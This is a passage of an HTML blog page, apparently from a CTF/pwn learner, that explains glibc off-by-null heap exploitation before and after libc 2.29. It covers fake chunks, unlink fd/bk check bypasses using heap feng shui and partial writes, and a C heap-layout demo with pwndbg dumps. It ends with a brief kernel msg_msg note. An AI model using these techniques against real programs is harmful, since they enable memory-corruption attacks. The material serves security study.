+<del>没有所有权的编程是这样的</del></p>
+<h3 id="off-by-null">off by null</h3>
+<p>也是堆溢出的一种形式，但还是区分一下。在这里可以攻击保护全开的程序，主要利用点为堆可以合并。</p>
+<p>libc2.29 以前</p>
+<ul>
+<li>先释放chunk A.</li>
+<li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为0.</li>
+<li>再释放chunk C。</li>
+</ul>
+<p>libc2.29 以后有个检查，会检查prev_chunk size是否和当前的 chunk 的 prev_size 相同，而 off by null，我们无法直接改变 chunk size，因此我们在chunk里伪造一个chunk</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (__glibc_unlikely(chunksize(p) <span style="color:#ff79c6">!=</span> prevsize))
+</span></span></code></pre></div><p>修改后的off by null利用手段，因为没有arena的检查，只是检查了in_use位和size相关检查</p>
+<ul>
+<li>三个堆 A，B，C，最好是 0x438 这种不是整数类型的，会存在一段公用的结果。c防止与top_chunk合并</li>
+<li>编辑A，在A中<strong>伪造一个堆</strong>，覆盖掉B的prev_inuse 位</li>
+<li>free掉B，就会向后合并。</li>
+<li>但是需要绕过unlink_chunk中对fd, bk检查 <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>。</li>
+</ul>
+<p>简单点的题目会给我们一个基地址，这里我们就可以直接像unlink一样修改fd,bk就行</p>
+<ul>
+<li>tcache leak 在libc 2.32 需要 <code>(fd&gt;&gt;12) ^ 0</code></li>
+<li>unsorted bin 存在两个chunk，泄露其中一个的 fd,bk可以得到堆地址</li>
+<li>largebin 的四个指针，只有一个chunk可以使用fd_nextsize 和 bk_nextsize指向自己</li>
+</ul>
+<p>在比较苛刻的条件下，我们不能泄露堆地址，但是可以通过布局heap fengshui 进行伪造fake chunk。假设程序存在off by null</p>
+<ul>
+<li>a-x-b-c-x-d-x, a,b,c,d 大小都在unsorted bin里，x是避免合并的chunk （c&gt;d&gt;a=b）</li>
+<li>free a, c, d 拿fd来说就是形成 d-&gt;c-&gt;a-&gt;arena 的链表。</li>
+<li>free b 这时候b,c合并。变成了 b-&gt;d-&gt;a-&gt;arena 链表，但是这时候c的指针并没有清除。</li>
+<li>unsorted bin FIFO。此处需要将 a，d放入largebin里，然后切割 b-c，生成e，e包含c的 fd, bk指针。</li>
+<li>清空unsorted bin 获得f</li>
+<li>编辑 e，可以改原来c位置的size，并且同时包含了fd, bk 指针。因此此处我们需要改一点完成unlink中的检查。</li>
+<li>之前chunk c-&gt;fd=a, c-&gt;bk=d。因为其放入了largebin里 a-&gt;bk = d， d-&gt;fd = a，无法通过检查，因此我们需要想办法满足条件</li>
+<li>将a,d从large bin 拿出来。</li>
+<li>bypass bk指针：free a, free f。a-&gt;bk = f, 将a拿出来，不会清空指针，修改一下bk指针，因为f和c距离比较近，因此我们可以通过partial write修改bk</li>
+<li>bypass fd指针: 直接向bypass bk一样，bk指向的是arena。free f, free d，d-&gt;fd=f。让后让其进入largebin里，d-&gt;fd=f。拿回d就行
+<ul>
+<li>这里为什么不在unsortbin里：直接拿出d，会先将f放入largebin，然后d-&gt;arena 形成链表。先拿f再拿出d, d-&gt;arena链表。都破坏了fd指针（没有指向堆。</li>
+</ul>
+</li>
+</ul>
+<p>可以使用这段代码调试，没有指针改变，主要看的是可行性。</p>
+<ul>
+<li>最好重新分布一下size，最简单是修改 <code>x0</code> 大小。保证f和c 只有最后一个字节不同</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>a <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>x0 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>b <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>c <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);  
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>x1 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>d <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x428</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>x2 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  free(a);
+</span></span><span style="display:flex;"><span>  free(c);
+</span></span><span style="display:flex;"><span>  free(d);
+</span></span><span style="display:flex;"><span>  free(b);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>e <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);   <span style="color:#6272a4">// 切割 b-c
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>f <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);  <span style="color:#6272a4">// 清除unsorted bin
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  d <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x428</span>);        <span style="color:#6272a4">// largebin 获得 p4
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  a <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);        <span style="color:#6272a4">// large bin 获得 p1
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  free(a);
+</span></span><span style="display:flex;"><span>  free(f); <span style="color:#6272a4">// p1-&gt;bk = 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  a <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
+</span></span><span style="display:flex;"><span>  f <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  free(f);
+</span></span><span style="display:flex;"><span>  free(d);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  malloc(<span style="color:#bd93f9">0x1000</span>); <span style="color:#6272a4">// large bin
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  d <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x428</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>bk bypass</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p f
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>void *<span style="color:#ff79c6">)</span> 0x555555559b20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/8xg 0x555555559b20-0x30
+</span></span><span style="display:flex;"><span>0x555555559af0: 0x0000000000000000      0x0000000000000441
+</span></span><span style="display:flex;"><span>0x555555559b00: 0x0000555555559290      0x0000555555559f50
+</span></span><span style="display:flex;"><span>0x555555559b10: 0x0000000000000000      0x0000000000000421
+</span></span><span style="display:flex;"><span>0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 这里bk需要覆盖2byte才行，可以优化size，让其只覆盖1byte就行。</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/4xg 0x0000555555559290
+</span></span><span style="display:flex;"><span>0x555555559290: 0x0000000000000000      0x0000000000000421
+</span></span><span style="display:flex;"><span>0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10
+</span></span></code></pre></div><p>fd bypass</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p f
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>void *<span style="color:#ff79c6">)</span> 0x555555559b20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/8xg 0x555555559b20-0x30
+</span></span><span style="display:flex;"><span>0x555555559af0: 0x0000000000000000      0x0000000000000441
+</span></span><span style="display:flex;"><span>0x555555559b00: 0x0000555555559290      0x0000555555559f50
+</span></span><span style="display:flex;"><span>0x555555559b10: 0x0000000000000000      0x0000000000000421
+</span></span><span style="display:flex;"><span>0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 这里就是fd</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/8xg 0x0000555555559f50
+</span></span><span style="display:flex;"><span>0x555555559f50: 0x0000000000000000      0x0000000000000431
+</span></span><span style="display:flex;"><span>0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0
+</span></span><span style="display:flex;"><span>0x555555559f70: 0x0000555555559b10      0x0000555555559b10
+</span></span><span style="display:flex;"><span>0x555555559f80: 0x0000000000000000      0x0000000000000000
+</span></span></code></pre></div><h2 id="kernel-">kernel ?</h2>
+<ul>
+<li>kernel 存在很多的 list_head 结构体，我们可以使用 <strong>条件竞争</strong> 来修改指针，借助如同 msg_msg 结构体来进行任意地址写</li>
+</ul>
+<h2 id="参考文章">参考文章</h2>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/197635">How2Heap堆利用学习笔记（三）：Unsafe_unlink</a></li>
+<li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-堆基础之Unsafe Unlink)</a></li>
+<li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
